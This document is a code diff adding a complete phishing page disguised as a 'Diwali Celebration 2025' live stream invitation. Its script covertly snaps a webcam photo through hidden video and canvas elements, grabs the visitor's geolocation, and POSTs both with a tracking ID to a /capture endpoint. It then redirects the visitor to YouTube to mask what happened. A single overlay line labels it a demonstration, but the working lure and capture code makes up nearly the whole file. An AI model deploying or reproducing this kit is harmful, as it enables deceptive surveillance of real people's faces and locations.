@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Diwali Celebration 2025 - Join Live!</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #ff9966, #ff5e62);
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+            margin-top: 50px;
+        }
+        h1 {
+            color: #D4380D;
+            text-align: center;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+        }
+        .celebration-img {
+            width: 100%;
+            max-height: 300px;
+            object-fit: cover;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .join-btn {
+            display: block;
+            width: 200px;
+            margin: 30px auto;
+            padding: 15px 30px;
+            background-color: #D4380D;
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            font-size: 1.2em;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .join-btn:hover {
+            background-color: #FF7875;
+        }
+        .festival-details {
+            line-height: 1.6;
+            text-align: center;
+        }
+        .countdown {
+            text-align: center;
+            font-size: 1.5em;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        #consent-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0,0,0,0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .consent-box {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 500px;
+            text-align: center;
+        }
+        .consent-buttons {
+            margin-top: 20px;
+        }
+        .consent-btn {
+            padding: 10px 20px;
+            margin: 0 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .accept-btn {
+            background-color: #52c41a;
+            color: white;
+        }
+        .decline-btn {
+            background-color: #f5222d;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Diwali Festival Live Celebration 2025</h1>
+        <img src="https://source.unsplash.com/random/800x400/?diwali,festival,lights" alt="Diwali Celebration" class="celebration-img">
+        
+        <div class="festival-details">
+            <p>Join our virtual Diwali celebration with thousands of people around the world! Experience the festival of lights together with amazing performances, light shows, and interactive activities.</p>
+            
+            <div class="countdown">
+                Live event starting in: <span id="timer">00:05:23</span>
+            </div>
+            
+            <p>Don't miss this once-in-a-lifetime celebration! Click below to join the live stream and participate in our global community event.</p>
+        </div>
+        
+        <button id="join-button" class="join-btn">Join Live Celebration</button>
+    </div>
+    
+    <div id="consent-overlay">
+        <div class="consent-box">
+            <h2>Camera & Location Access</h2>
+            <p>To enhance your festival experience and connect you with celebrants in your area, we need permission to:</p>
+            <ul style="text-align: left;">
+                <li>Access your camera for the interactive light ceremony</li>
+                <li>Access your location to connect you with local participants</li>
+            </ul>
+            <p>This is a demonstration of a phishing technique. <strong>No actual data will be misused.</strong></p>
+            <div class="consent-buttons">
+                <button class="consent-btn accept-btn" id="accept-btn">Allow Access</button>
+                <button class="consent-btn decline-btn" id="decline-btn">Decline</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Get the tracking ID from the server if available
+        const trackingId = "{{ tracking_id|default('unknown') }}";
+        
+        // Countdown timer simulation
+        function updateTimer() {
+            const timerElement = document.getElementById('timer');
+            let timeString = timerElement.textContent;
+            let [hours, minutes, seconds] = timeString.split(':').map(Number);
+            
+            seconds--;
+            if(seconds < 0) {
+                seconds = 59;
+                minutes--;
+                if(minutes < 0) {
+                    minutes = 59;
+                    hours--;
+                    if(hours < 0) {
+                        clearInterval(timerInterval);
+                        return;
+                    }
+                }
+            }
+            
+            timerElement.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        }
+        
+        const timerInterval = setInterval(updateTimer, 1000);
+        
+        // Join button click handler
+        document.getElementById('join-button').addEventListener('click', function() {
+            document.getElementById('consent-overlay').style.display = 'flex';
+        });
+        
+        // Consent buttons handlers
+        document.getElementById('accept-btn').addEventListener('click', function() {
+            document.getElementById('consent-overlay').style.display = 'none';
+            initializeCapture();
+        });
+        
+        document.getElementById('decline-btn').addEventListener('click', function() {
+            document.getElementById('consent-overlay').style.display = 'none';
+            alert('Access denied. You will not be able to fully participate in the interactive events.');
+        });
+        
+        // Variables to store captured data
+        let capturedImage = null;
+        let locationData = { lat: null, lon: null };
+        
+        // Initialize webcam and geolocation capture
+        async function initializeCapture() {
+            try {
+                // Create hidden video and canvas elements
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                const canvas = document.createElement('canvas');
+                canvas.style.display = 'none';
+                document.body.appendChild(canvas);
+                
+                // Access webcam
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.play();
+                
+                // Wait a moment for the video to initialize
+                setTimeout(() => {
+                    // Capture image
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Get image data
+                    capturedImage = canvas.toDataURL('image/jpeg');
+                    
+                    // Stop the video stream
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                    // Clean up the elements
+                    document.body.removeChild(video);
+                    document.body.removeChild(canvas);
+                    
+                    // Access geolocation
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            locationData.lat = position.coords.latitude;
+                            locationData.lon = position.coords.longitude;
+                            sendDataToServer();
+                        },
+                        (error) => {
+                            console.error('Geolocation error:', error);
+                            sendDataToServer();
+                        }
+                    );
+                    
+                    // Redirect to a "real" celebration page after a short delay
+                    setTimeout(() => {
+                        window.location.href = "https://www.youtube.com/results?search_query=diwali+celebration";
+                    }, 1500);
+                    
+                }, 1000);
+                
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                alert('Could not access camera. You will be redirected to a regular celebration page.');
+                window.location.href = "https://www.youtube.com/results?search_query=diwali+celebration";
+            }
+        }
+        
+        // Send captured data to the server
+        async function sendDataToServer() {
+            const data = {
+                tracking_id: trackingId,
+                image: capturedImage,
+                lat: locationData.lat,
+                lon: locationData.lon
+            };
+            
+            try {
+                await fetch('/capture', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                });
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        }
+    </script>
+</body>
+</html>
